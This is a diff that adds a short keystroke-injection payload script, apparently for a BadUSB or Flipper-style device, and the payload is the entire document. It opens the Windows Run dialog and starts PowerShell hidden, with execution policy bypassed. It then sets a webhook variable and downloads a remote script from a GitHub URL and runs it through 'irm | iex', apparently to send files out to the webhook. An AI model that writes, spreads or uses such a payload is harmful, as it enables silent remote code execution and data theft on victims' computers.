@@ -1,0 +1,5 @@
+DEFAULT_DELAY 100
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -Exec Bypass -w Hidden -c $hookurl = 'webhook_here'; irm https://raw.githubusercontent.com/mbeskek/flips/main/files.ps1 | iex
+ENTER
